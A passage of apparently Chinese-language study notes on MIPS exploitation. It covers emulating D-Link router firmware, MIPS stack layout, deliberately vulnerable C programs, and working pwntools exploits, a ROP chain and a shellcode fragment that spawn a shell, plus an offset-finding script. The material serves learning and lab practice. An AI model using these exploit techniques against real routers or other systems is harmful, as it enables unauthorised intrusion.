href="ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_REVA_FIRMWARE_1.13_WW.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_REVA_FIRMWARE_1.13_WW.ZIP</a></p><p>提取固件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -e </span><br></pre></td></tr></table></figure><p>搜索<code>boa</code>程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find ./ -name boa</span><br><span class="line">cp ./bin/boa .</span><br></pre></td></tr></table></figure><p>动态调试固件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./qemu-mips -g 1234 ./bin/boa</span><br></pre></td></tr></table></figure><p><strong>ampib.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_CAPTCHA 0x2C1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">apmib_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// Fake it</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apmib_get</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">int</span> *value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(code) &#123;</span><br><span class="line"><span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">*value = <span class="number">0xF1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">*value = <span class="number">0x7F000001</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">*value = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成<code>apmib-ld.so</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br></pre></td></tr></table></figure><p>复制至固件根文件系统，运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips -E LD_PRELOAD=&quot;/apmib-ld.so&quot; ./bin/boa</span><br></pre></td></tr></table></figure><h2 id="MIPS32"><a href="#MIPS32" class="headerlink" title="MIPS32"></a>MIPS32</h2><h3 id="堆栈原理"><a href="#堆栈原理" class="headerlink" title="堆栈原理"></a>堆栈原理</h3><ul><li>栈操作：没有ESP, 进入函数时需要将当前栈指针向下移动<code>n</code>比特, 该大小为<code>n</code>比特的存储空间就是此函数的<code>Stack Frame</code>的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量</li><li>调用：如果函数A调用函数B, 调用者函数（函数A)会在自己的栈顶预留一部分空间来保存被调用者（函数B)的参数，我们称之为调用参数空间</li><li>参数传递方式：前4个传入参数通过<code>$a0~$a3</code>传递。有些函数的参数可能超过4个，此时多余的参数会被放入调用参数空间</li><li>返回地址：MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中</li></ul><h3 id="函数调用的栈布局"><a href="#函数调用的栈布局" class="headerlink" title="函数调用的栈布局"></a>函数调用的栈布局</h3><ul><li>叶子函数: 不再调用其他函数的函数</li><li>非叶子函数：调用其他函数的函数</li></ul><ol><li><p>函数调用过程</p><ol><li>当执行到调用函数的指令时，函数调用指令复制当前的<code>$PC</code>寄存器的值到<code>$RA</code>寄存器，即当前<code>$RA</code>的值就是当前函数执行结束的返回地址，然后跳转到函数并执行</li><li>程序跳转到函数以后，如果函数是非叶子函数，则函数首先会把上一个函数的返回地址(<code>$RA</code>)存入堆栈</li><li>函数返回时，如果被调用函数是叶子函数，则直接使用<code>jr $ra</code>指令返回函数A, 这里的寄存器<code>$RA</code>指向返回地址。如果函数是非叶子函数，函数先从堆栈中取出保存在堆栈上的返回地址，然后将返回地址存入寄存器<code>$RA</code>, 再使用<code>jr $ra</code>指令返回调用函数</li></ol></li><li><p>函数调用参数传递</p><p><code>$a0 ~ $a3</code>传递前4个参数，其他参数通过栈传递。函数栈帧的组织如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211021194812565.png" alt="image-20211021194812565"></p></li></ol><p><strong>more_argument.c :</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">more_argument</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dst[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dst, <span class="string">&quot;%d%d%d%d%d\n&quot;</span>, a, b, c, d, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> e = <span class="number">1</span>;</span><br><span class="line">    more_argument(a, b, c, d, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数的汇编代码如下, 前4个参数往<code>$a0~$a3</code>传递，第5个参数往栈传输</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211021202457948.png" alt="image-20211021202457948"></p><h3 id="栈溢出可行性"><a href="#栈溢出可行性" class="headerlink" title="栈溢出可行性"></a>栈溢出可行性</h3><ol><li>非叶子函数：有缓冲区溢出漏洞，可以覆盖某一个函数的返回值</li><li>叶子函数：可以溢出大量数据的情况，就存在通过覆盖父函数中的返回地址利用缓冲区溢出漏洞的可能性</li></ol><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><ul><li>自己给自己出两道题玩</li><li>均为<code>ret2text</code></li></ul><h3 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h3><p><strong>源码</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc -fno-stack-protector mips_overflow.c -o mips_overflow</span><br></pre></td></tr></table></figure><p>32位 大端序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>直接溢出到返回地址就可以了，跟x86一样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mips&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mips-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow&#x27;</span>])</span><br><span class="line">get_shell_addr = <span class="number">0x004007A0</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(get_shell_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your name:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> _buf[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        _buf[i] = buf[i];</span><br><span class="line">    &#125; <span class="comment">// 栈溢出漏洞</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    check();</span><br><span class="line">    <span class="built_in">printf</span>(buf); <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mipsel-linux-gnu-gcc -fno-stack-protector mips_overflow2.c -o mips_overflow2</span><br></pre></td></tr></table></figure><p>32 位小端序</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><p>这个比较复杂，因为要覆盖到main的返回地址且<code>$fp</code>也在栈上，不能被覆盖，所以需要先泄露一下栈的地址，由于没法直接泄露<code>$fp</code>所以从栈上找一个栈的地址，通过格式化字符串漏洞泄露出来，然后算偏移即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211022202807931.png" alt="image-20211022202807931"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow2&#x27;</span>])</span><br><span class="line">p.send(<span class="string">b&quot;%9$p&quot;</span>)</span><br><span class="line">fp = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>) - <span class="number">0xf4</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(fp))</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">get_shell_addr = <span class="number">0x00400780</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>, <span class="string">&#x27;./mips_overflow2&#x27;</span>])</span><br><span class="line">p.send(<span class="string">b&quot;1&quot;</span> * <span class="number">0x18</span> + p32(fp) + <span class="string">b&quot;0&quot;</span> * <span class="number">0x1c</span> + p32(get_shell_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li t7, -3</span><br><span class="line">nor a0, t7, zero</span><br><span class="line">nor a1, t7, zero</span><br><span class="line">slti a2, zero, -1</span><br><span class="line">li v0, 4183 ( sys_socket )</span><br><span class="line">syscall 0x40404</span><br><span class="line"></span><br><span class="line">sw v0, -1(sp)</span><br></pre></td></tr></table></figure><h3 id="NOP-Sled"><a href="#NOP-Sled" class="headerlink" title="NOP Sled"></a>NOP Sled</h3><ul><li>MIPS中, NOP指令的机器码是0x00000000, 如果使用NOP实现跳转缓冲，会影响以0x00截断的字符串复制函数，如 strcpy 函数</li><li>实际上，宏观的NOP指令可以被认为，一切不影响Shellcode执行的命令都可以作为NOP指令在组织缓冲区进行填充<ul><li>例如，<code>$a2</code>的值不会影响Shellcode的执行，因此如<code>lui $a2, 0x0202</code>的机器码<code>0x3C060202</code>可以用于填充</li></ul></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><blockquote><p>这里给的<code>vuln_system.c</code>与<code>vuln_system</code>不是同一个代码</p><p>这里以所给的<code>vuln_system</code>为例,  因此EXP与书中代码略有差距</p></blockquote><p><strong>vuln_system</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025215812508.png" alt="image-20211025215812508"></p><p><strong>checksec vuln_system</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>攻击思路: 通过溢出构造ROP链，向<code>$a1</code>中传入<code>sh</code>, 跳到<code>do_system</code>函数进行<code>getshell</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023202154982.png" alt="image-20211023202154982"></p><p>溢出大小<code>4 - -0x104 = 0x108</code></p><p>通过<code>IDA插件mipsrop</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinders()</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00401D40  |  addiu $a1,$sp,0x54+var_3C                           |  jr    0x54+var_s0($sp)                |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>搜索到一条指令</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023200326635.png" alt="image-20211023200326635"></p><p>从代码中可以看到只要在<code>$sp + 24</code>中写入<code>sh</code>,<code>$a1</code>便可指向命令字符串，在<code>jr $ra</code>命令返回时，同样在<code>$sp + 84</code>处让流程跳转到<code>do_system_0</code>函数即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023200612220.png" alt="image-20211023200612220"></p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;sh&quot;</span>.ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">a1_addr = <span class="number">0x00401D40</span></span><br><span class="line">do_system_addr = <span class="number">0x00400554</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;A&quot;</span> * <span class="number">0x108</span></span><br><span class="line">shellcode += p32(a1_addr)</span><br><span class="line">shellcode += <span class="string">b&quot;B&quot;</span> * <span class="number">24</span></span><br><span class="line">shellcode += cmd</span><br><span class="line">shellcode += <span class="string">b&quot;C&quot;</span> * (<span class="number">0x3C</span> - <span class="built_in">len</span>(cmd))</span><br><span class="line">shellcode += p32(do_system_addr)</span><br><span class="line">shellcode += <span class="string">b&quot;DDDD&quot;</span></span><br><span class="line"></span><br><span class="line">fw = <span class="built_in">open</span>(<span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br></pre></td></tr></table></figure><p><strong>getshell</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211023203132896.png" alt="image-20211023203132896"></p><h2 id="IDA-mipsrop"><a href="#IDA-mipsrop" class="headerlink" title="IDA mipsrop"></a>IDA mipsrop</h2><p><a href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop">ida/plugins/mipsrop at master · tacnetsol/ida (github.com)</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>放<code>plugin</code>目录下即可</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>Search =&gt; mips rop gadgets</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211022221658923.png" alt="image-20211022221658923"></p><p>接着便可以在下方输入框中进行各项输入, 输入<code>mipsrop.help()</code>查看使用方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt; mipsrop.<span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>格式修改一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsrop.find(instruction_string)</span><br><span class="line">        Locates all potential ROP gadgets that contain the specified</span><br><span class="line">        instruction.</span><br><span class="line"></span><br><span class="line">        @instruction_string - The instruction you need executed. This can be</span><br><span class="line">        either a:</span><br><span class="line"></span><br><span class="line">                    o Full instruction    - &quot;li $a0, 1&quot;</span><br><span class="line">                    o Partial instruction - &quot;li $a0&quot;</span><br><span class="line">                    o Regex instruction   - &quot;li $a0, .*&quot;</span><br><span class="line">mipsrop.system()</span><br><span class="line">        Prints a list of gadgets that may be used to call system().</span><br><span class="line">mipsrop.doubles()</span><br><span class="line">        Prints a list of all &quot;double jump&quot; gadgets (useful for function calls).</span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">        Prints a list of all gadgets that put a stack address into a register.</span><br><span class="line">mipsrop.tails()</span><br><span class="line">        Prints a lits of all tail call gadgets (useful for function calls).</span><br><span class="line">mipsrop.set_base()</span><br><span class="line">        Set base address used for display</span><br><span class="line">mipsrop.summary()</span><br><span class="line">        Prints a summary of your currently marked ROP gadgets, in alphabetical</span><br><span class="line">        order by the marked name. To mark a location as a ROP gadget, simply</span><br><span class="line">        mark the position in IDA (Alt+M) with any name that starts with &quot;ROP&quot;.</span><br></pre></td></tr></table></figure><h2 id="确定偏移脚本-patternLocOffset-py"><a href="#确定偏移脚本-patternLocOffset-py" class="headerlink" title="确定偏移脚本 patternLocOffset.py"></a>确定偏移脚本 patternLocOffset.py</h2><ul><li>稍微修改了一下，适配python3</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"><span class="comment">## Create pattern strings &amp; location offset </span></span><br><span class="line"><span class="comment">## Tested against Ubuntu 12.04 &amp; Windows # #</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## Example:</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patterLocOffset.py -c -l 260 -f output.txt</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [+] output to output.txt ok!</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## C:\Users\Lenov\Desktop&gt; patternLocOffset.py -s 0x41613141 -l 260</span></span><br><span class="line"><span class="comment">### [*] Create pattern string contains 260 characters ok!</span></span><br><span class="line"><span class="comment">### [*] Exact match at offset 3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Nimdakey # 09-10-2013</span></span><br><span class="line"><span class="comment">#####################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = string.ascii_uppercase</span><br><span class="line">b = string.ascii_lowercase</span><br><span class="line">c = string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">count,output</span>):</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Create pattern string contains %d characters&#x27;</span>%count, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i//(<span class="number">26</span>*<span class="number">10</span>)]+b[(i%(<span class="number">26</span>*<span class="number">10</span>))//<span class="number">10</span>]+c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] output to %s&#x27;</span>%output, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        fw = <span class="built_in">open</span>(output,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close() </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] take time: %.4f s&quot;</span>%(time.time()-timeStart))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># pattern search</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    pattern = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    is0xHex = re.match(<span class="string">&#x27;^0x[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">    isHex = re.match(<span class="string">&#x27;^[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is0xHex:</span><br><span class="line">        <span class="comment">#0x41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">elif</span> isHex:</span><br><span class="line">        <span class="comment">#41613141</span></span><br><span class="line">        pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] seach Pattern eg:0x41613141&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    source = generate(length, <span class="literal">None</span>).encode()</span><br><span class="line">    offset = source.find(pattern)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exact match at offset %d&quot;</span>%offset)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] No exact matches, looking for likely candidates...&quot;</span>)</span><br><span class="line">        reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">        reverse.reverse()</span><br><span class="line">        pattern = <span class="built_in">bytes</span>(reverse)</span><br><span class="line">        offset = source.find(pattern)</span><br><span class="line">        <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Possible match at offset %d (adjusted another-endian)&quot;</span>%offset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] take time: %.4f s&quot;</span>%(time.time()-timeStart))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">## parse argument</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--search&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;search for pattern&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--create&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;create a pattern&#x27;</span>,\</span><br><span 